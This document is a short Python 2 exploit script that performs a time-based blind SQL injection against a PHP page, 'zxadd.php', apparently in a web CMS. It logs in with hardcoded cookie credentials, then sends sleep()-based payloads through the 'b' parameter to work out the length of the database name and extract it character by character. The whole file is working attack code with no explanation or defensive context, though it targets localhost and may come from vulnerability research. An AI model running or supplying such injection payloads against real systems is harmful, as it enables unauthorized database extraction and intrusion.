# -*- coding:utf-8 -*-
import requests
import hashlib

url = "http://localhost/user/zxadd.php"
cookies = {
	"UserName":"spook",
	"PassWord":hashlib.md5("spook").hexdigest()
}
length=0
print "[+] Begin to parse the length the database"
for i in xrange(20):
	sql = "?b=0 or if(length(database())>"+str(i)+",0,sleep(5))%23"
	try:
		r = requests.get(url+sql,cookies=cookies,timeout=5)
	except:
		length+=i
		break
print "The length of database is "+str(length)

print "[+] Begin to parse the name of database"
db_name=''
for i in xrange(1,length+1):
	for j in xrange(32,127):
		sql2 = "?b=0 or if(ascii(mid((select database()),"+str(i)+",1))="+str(j)+",sleep(5),0)%23"
		try:
			r2 = requests.get(url+sql2,cookies=cookies,timeout=5)
		except:
			db_name+=chr(j)
			print db_name
			break
print "The name of the database is"+db_name